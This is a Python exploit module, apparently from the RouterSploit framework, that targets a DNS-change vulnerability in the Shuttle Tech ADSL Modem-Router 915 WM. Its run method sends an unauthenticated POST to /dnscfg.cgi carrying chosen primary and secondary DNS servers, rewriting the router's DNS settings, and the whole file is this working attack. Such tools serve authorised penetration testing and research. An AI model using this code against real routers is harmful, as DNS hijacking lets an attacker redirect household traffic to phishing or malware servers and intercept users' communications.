# rsf exploit module
# description: Module exploits Shuttle Tech ADSL Modem-Router 915 WM DNS change vulnerability. If the target is vulnerable it is possible to change DNS settings.

import http.client
import urllib.parse

class Exploit:
    __info__ = {
        "name": "Shuttle 915 WM DNS Change",
        "description": "Module exploits Shuttle Tech ADSL Modem-Router 915 WM dns change vulnerability. "
                       "If the target is vulnerable it is possible to change dns settings.",
        "authors": (
            "Todor Donev <todor.doven[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/35995/",
            "https://github.com/jh00nbr/Routerhunter-2.0",
        ),
        "devices": (
            "Shuttle Tech ADSL Modem-Router 915 WM",
        )
    }

    def __init__(self, target_ip, port=80, dns1="8.8.8.8", dns2="8.8.4.4"):
        self.target_ip = target_ip
        self.port = port
        self.dns1 = dns1
        self.dns2 = dns2

    def http_post(self, path):
        conn = http.client.HTTPConnection(self.target_ip, self.port, timeout=5)
        try:
            conn.request("POST", path)
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return response.status, data
        except:
            return None, None

    def run(self):
        path = "/dnscfg.cgi?dnsPrimary={}&dnsSecondary={}&dnsDynamic=0&dnsRefresh=1".format(
            urllib.parse.quote(self.dns1), urllib.parse.quote(self.dns2)
        )

        print("[*] Attempting to change DNS settings...")
        print("[*] Primary DNS: {}".format(self.dns1))
        print("[*] Secondary DNS: {}".format(self.dns2))

        status, _ = self.http_post(path)

        if status == 200:
            print("[+] DNS settings have been changed")
        else:
            print("[-] Could not change DNS settings")

    def check(self):
        # Cannot verify without changing DNS
        return None

